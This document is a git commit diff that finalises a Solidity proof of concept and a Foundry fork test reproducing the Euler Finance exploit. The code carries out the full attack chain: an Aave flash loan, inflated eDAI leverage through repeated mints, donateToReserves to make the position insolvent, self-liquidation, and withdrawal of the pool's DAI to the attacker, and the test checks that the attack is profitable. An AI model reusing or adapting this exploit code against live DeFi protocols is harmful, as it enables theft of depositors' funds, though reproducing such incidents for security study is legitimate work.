5812a57a6b6329c2fc49bb3adef94bd2b6d4475b
Ana Julia <anajuliabit@gmail.com>
2023-10-29 20:53:53 -0300

    Finalize POC

--- src/EulerHackPoC.sol
+++ src/EulerHackPoC.sol
@@ -1,15 +1,29 @@
 // SPDX-License-Identifier: UNLICENSED
 // TODO update sol version
-pragma solidity ^0.8.0;
+pragma solidity ^0.8.4;
 
 import {Test, console2} from "forge-std/Test.sol";
 import {IPool} from "@aave/v3/interfaces/IPool.sol";
 import {FlashLoanSimpleReceiverBase} from "@aave/v3/flashloan/base/FlashLoanSimpleReceiverBase.sol";
 import {IERC20} from "@aave/v3/dependencies/openzeppelin/contracts/IERC20.sol";
 import {IPoolAddressesProvider} from "@aave/v3/interfaces/IPoolAddressesProvider.sol";
+import {EToken} from "euler-contracts/modules/EToken.sol";
+import {DToken} from "euler-contracts/modules/DToken.sol";
+import {Euler} from "euler-contracts/Euler.sol";
+import {Liquidation} from "euler-contracts/modules/Liquidation.sol";
 
-contract EulerHackPoC is FlashLoanSimpleReceiverBase, Test{
+error NotEnoughFunds(uint256 balance, uint256 amount);
+
+library EulerAddresses {
+    address constant EULER = 0x27182842E098f60e3D576794A5bFFb0777E025d3;
+    address constant eDAI = 0xe025E3ca2bE02316033184551D4d3Aa22024D9DC;
+    address constant dDAI = 0x6085Bc95F506c326DCBCD7A6dd6c79FBc18d4686;
+}
+
+contract EulerHackPoC is FlashLoanSimpleReceiverBase, Test {
+
     Violator private violator;
+
      constructor(
         IPoolAddressesProvider _addressProvider,
         address _collateral
@@ -17,7 +31,7 @@ contract EulerHackPoC is FlashLoanSimpleReceiverBase, Test{
          violator = new Violator();
      }
 
-    // 1. Flahsloan 30M DAI from AaveV2
+    // 1. Flahsloan from AaveV2
     function callFashLoan(address _tokenAddress, uint256 _amount) external {
        POOL.flashLoanSimple(address(this), _tokenAddress, _amount, "0x", 0);
     }
@@ -34,29 +48,32 @@ contract EulerHackPoC is FlashLoanSimpleReceiverBase, Test{
         returns (bool)
     {
 
-        // 2. Transfer the full 30m DAI loan balance to the violator
-        IERC20(asset).transfer(address(violator), amount);
+        IERC20 token = IERC20(asset);
+        // 2. Transfer the full loan balance to the violator
+        token.transfer(address(violator), amount);
 
-        // check balance
-        uint256 balance = IERC20(asset).balanceOf(address(this));
-        assertEq(balance, 0);
-        require(balance >= amount + premium, "Not enough funds to repay loan!");
+        // Start the attack using 2/3 of the funds
+        uint256 attackAmount = (amount / 3) * 2;
 
-        // Approve the LendingPool contract allowance to *pull* the owed amount
+        // Call violator and execute attack
+        violator.executeAttack(token, attackAmount);
+
+        // Check balance
+        uint256 balance = token.balanceOf(address(this));
+        uint256 repayAmount = amount + premium;
+
+        if(balance < repayAmount) {
+            revert NotEnoughFunds({
+                balance: balance,
+                amount: repayAmount
+            });
+        }
+
+        // Approve the LendingPool contract allowance to pull the owed amount
         uint amountOwing = amount + premium;
-        IERC20(asset).approve(address(POOL), amountOwing);
+        token.approve(address(POOL), amountOwing);
 
         return true;
-    }
-
-
-    function getBalance(address _tokenAddress) external view returns (uint256) {
-        return IERC20(_tokenAddress).balanceOf(address(this));
-    }
-
-    function withdraw(address _tokenAddress) external {
-        IERC20 token = IERC20(_tokenAddress);
-        token.transfer(msg.sender, token.balanceOf(address(this)));
     }
 
     receive() external payable {}
@@ -64,11 +81,70 @@ contract EulerHackPoC is FlashLoanSimpleReceiverBase, Test{
 }
 
 contract Violator {
-    function executeAttack() {
-        // 3. Deposit 20m DAI to the DAI EToken of Euler Finance, receiving ~19,56m eDAI tokens
+    Liquidator private liquidator;
 
+    constructor() {
+        liquidator = new Liquidator();
+    }
+
+    function executeAttack( IERC20 _token, uint256 _amount) external {
+        _token.approve(EulerAddresses.EULER, type(uint256).max);
+
+        // Check balance
+        uint256 balance = _token.balanceOf(address(this));
+
+        // minBalance = 1.5 * _amount since amount is 2/3 of the flashloan
+        uint256 minBalance = (_amount * 3) / 2;
+
+        if(balance < minBalance) {
+            revert NotEnoughFunds({
+                balance: balance,
+                amount: minBalance
+            });
+        }
+
+
+        EToken eToken = EToken(EulerAddresses.eDAI);
+
+        // 3. Deposit _amount to the EToken of Euler Finance
+        eToken.deposit(0, _amount);
+
+        // 4. Create a 10x artificial EToken leverage
+        uint256 amountLeveraged = _amount * 10;
+        eToken.mint(0, amountLeveraged);
+
+        DToken dToken = DToken(EulerAddresses.dDAI);
+        // 5. Repay _amount / 2 _token on the violator’s position, causing their DToken balance to decrease
+        dToken.repay(0, _amount / 2);
+
+        // 6. Create another 10x artificial EToken leverage
+        eToken.mint(0, amountLeveraged);
+
+        // 7. Donate half of EToken (leveraged) balance to the reserve of the EToken
+        eToken.donateToReserves(0, amountLeveraged / 2);
+
+        uint256 eTokenBalance = eToken.balanceOfUnderlying(address(this));
+        uint256 dTokenBalance = dToken.balanceOf(address(this));
+
+        // violator contains a significantly larger amount of DToken than EToken that will never be collateralized
+        assert(dTokenBalance > eTokenBalance);
+
+        // 8. Liquidate the violator’s position
+        return liquidator.executeLiquidation(msg.sender, _token, address(this));
     }
 }
-}
 
-contract Liquidator {}
+
+contract Liquidator {
+    Liquidation public constant liquidation = Liquidation(0xf43ce1d09050BAfd6980dD43Cde2aB9F18C85b34);
+
+    function executeLiquidation(address _attacker, IERC20 _token, address _violator) external {
+        Liquidation.LiquidationOpportunity memory liq =  liquidation.checkLiquidation(address(this), _violator, address(_token), address(_token));
+        liquidation.liquidate(_violator, address(_token), address(_token), liq.repay, liq.yield-1);
+
+        EToken(EulerAddresses.eDAI).withdraw(0, _token.balanceOf(EulerAddresses.EULER));
+        _token.transfer(_attacker, _token.balanceOf(address(this)));
+    }
+
+
+}
--- test/EulerHackPoC.t.sol
+++ test/EulerHackPoC.t.sol
@@ -1,46 +1,56 @@
 // SPDX-License-Identifier: UNLICENSED
 pragma experimental ABIEncoderV2;
-pragma solidity ^0.8.0;
+pragma solidity ^0.8.4;
 
 import {Test, console2} from "forge-std/Test.sol";
 import {EulerHackPoC} from "../src/EulerHackPoC.sol";
 import {IPoolAddressesProvider} from "@aave/v3/interfaces/IPoolAddressesProvider.sol";
 import {IPool} from "@aave/v3/interfaces/IPool.sol";
+import {IAToken} from "@aave/v3/interfaces/IAToken.sol";
+import {IPriceOracle} from "@aave/v3/interfaces/IPriceOracle.sol";
 import {DataTypes} from "@aave/v3/protocol/libraries/types/DataTypes.sol";
 import {IERC20} from "@aave/v3/dependencies/openzeppelin/contracts/IERC20.sol";
 
 contract EulerHackPoCTest is Test {
-    EulerHackPoC public attacker;
-    string MAINNET_RPC_URL = vm.envString("MAINNET_RPC_URL");
     // https://etherscan.io/tx/0xc310a0affe2169d1f6feec1c63dbc7f7c62a887fa48795d327d4d2da2d6b111d
     uint256 constant ATTACK_BLOCK_NUMBER = 16817996;
-    IPoolAddressesProvider public poolAddressesProvider;
     address constant DAI = 0x6B175474E89094C44Da98b954EedeAC495271d0F;
-    IPool public POOL;
+    // https://docs.aave.com/developers/deployed-contracts/v3-mainnet/ethereum-mainnet
+    address constant POOL_ADDRESSES_PROVIDER = 0x2f39d218133AFaB8F2B819B1066c7E434Ad94E9e;
+
+    EulerHackPoC public attacker;
+    IPool public pool;
 
     function setUp() public {
-        // TODO put attack block number here
-        vm.createSelectFork(MAINNET_RPC_URL);
-        poolAddressesProvider = IPoolAddressesProvider(0x2f39d218133AFaB8F2B819B1066c7E434Ad94E9e);
-        POOL = IPool(poolAddressesProvider.getPool());
+        vm.createSelectFork(vm.envString("MAINNET_RPC_URL"), ATTACK_BLOCK_NUMBER - 1);
+        IPoolAddressesProvider poolAddressesProvider = IPoolAddressesProvider(POOL_ADDRESSES_PROVIDER);
+        pool = IPool(poolAddressesProvider.getPool());
         attacker = new EulerHackPoC(poolAddressesProvider, DAI);
-
-    }
-
-    function test_getConfiguration() public {
-        DataTypes.ReserveConfigurationMap memory config = POOL.getConfiguration(DAI);
-        //bit 56: reserve is active
-        // check if reserve is active
-        assertEq(config.data & 2**56, 2**56);
     }
 
     function test_Attack() public {
-        // impersonate random account with DAI, from https://etherscan.io/token/0x6b175474e89094c44da98b954eedeac495271d0f#balances
-        address daiHolder = 0x47ac0Fb4F2D84898e4D9E7b4DaB3C24507a6D503;
+        // Get the attacker's balance before the attack
+        uint256 attackerBalanceBefore = IERC20(DAI).balanceOf(address(attacker));
+        console2.log("Attacker DAI balance before:", attackerBalanceBefore/ 1e18);
 
-        uint256 borrowAmount = 30 * 10**18;
+        // Get reserve data
+        DataTypes.ReserveData memory reserveData = pool.getReserveData(DAI);
 
-        attacker.callFashLoan(DAI, borrowAmount);
-        assertEq(address(attacker).balance, borrowAmount);
+        // Calculate how much we can borrow
+        IERC20 stableDebtToken = IERC20(reserveData.stableDebtTokenAddress);
+        IERC20 variableDebtToken = IERC20(reserveData.variableDebtTokenAddress);
+        uint256 totalLiquidity = IERC20(reserveData.aTokenAddress).totalSupply();
+        uint256 availableForBorrowing = totalLiquidity - (variableDebtToken.totalSupply() + stableDebtToken.totalSupply() + reserveData.unbacked + reserveData.accruedToTreasury);
+
+        // Execute the attack
+        console2.log("Executing attack, borrowing ", availableForBorrowing / 1e18);
+        attacker.callFashLoan(DAI, availableForBorrowing);
+
+        // Get the attacker's balance after the attack
+        uint256 attackerBalanceAfter = IERC20(DAI).balanceOf(address(attacker));
+        console2.log("Attacker DAI balance after", attackerBalanceAfter / 1e18);
+
+        // Check if the attack was profitable
+        assertGt(attackerBalanceAfter, attackerBalanceBefore);
     }
 }
